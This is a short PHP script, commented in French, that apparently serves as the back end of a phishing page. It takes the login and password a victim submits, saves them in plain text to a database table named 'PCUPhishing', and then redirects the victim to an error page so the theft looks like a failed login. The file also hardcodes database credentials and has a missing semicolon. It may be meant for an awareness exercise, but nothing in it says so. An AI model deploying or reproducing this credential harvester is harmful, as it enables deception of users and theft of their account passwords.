<?php
$serveur="localhost";
$dbname="pcuphishing";
$user="root";
$pass="mdpbdd"

$login = $_POST["login"];
$password = $_POST["password"];

try{
        //On se connecte à la BDD
        $dbco = new PDO("mysql:host=$serveur;dbname=$dbname",$user,$pass);
        $dbco->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);

        //On insère les données reçues
        $sth = $dbco->prepare("
            INSERT INTO PCUPhishing(login, mdp) VALUES(:login, :mdp)");
        $sth->bindParam(':login',$login);
        $sth->bindParam(':mdp',$password);
        $sth->execute();

        //On renvoie l'utilisateur vers la page d'erreur
        header('Location: error_page.html');
        exit;
    }
    catch(PDOException $e){
        echo 'Impossible de traiter les données. Erreur : '.$e->getMessage();
    }




 ?>
